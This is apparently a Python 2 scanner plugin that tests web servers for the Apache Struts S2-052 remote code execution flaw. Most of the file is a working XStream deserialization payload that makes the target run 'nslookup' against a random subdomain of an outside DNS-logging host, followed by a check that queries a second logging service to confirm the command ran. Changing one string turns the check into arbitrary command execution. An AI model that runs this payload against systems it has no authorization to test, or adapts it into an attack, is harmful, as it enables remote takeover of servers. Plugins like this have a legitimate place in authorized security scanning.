# coding=utf-8
import urllib2
import random
import socket
import time
from config import is_port_open, is_http


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)


@is_port_open
def verify(ip, port=80, name=None, timeout=10):
    if is_http(ip, int(port)) is False:
        return
    if port == 443:
        url = "https://%s" % (ip)
    else:
        url = "http://%s:%d" % (ip, port)
    test_str = random_str(6)
    server_ip = test_str + ".devil.yoyostay.top"
    post_data = """<map>
<entry>
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>nslookup</string><string>%s</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
</entry>
</map>""" % (server_ip)
    res = urllib2.urlopen(url, timeout=timeout)
    url = res.geturl()
    if "Set-Cookie" in res.headers and "JSESSIONID" in res.headers["Set-Cookie"]:
        request = urllib2.Request(url, post_data)
        request.add_header("Content-Type", "application/xml")
        try:
            urllib2.urlopen(request, timeout=timeout)
        except Exception, e:
            if e.code == 500:
                time.sleep(2)
                check = urllib2.urlopen("http://dnslog.niufuren.cc/api/dns/devil/%s/" % (test_str), timeout=timeout).read()
                if "True" in check:
                    info = {
                        "url": url,
                        "vuln_name": "s2_052 rce",
                        "severity": "high",
                        "proof": server_ip
                    }
                    return info
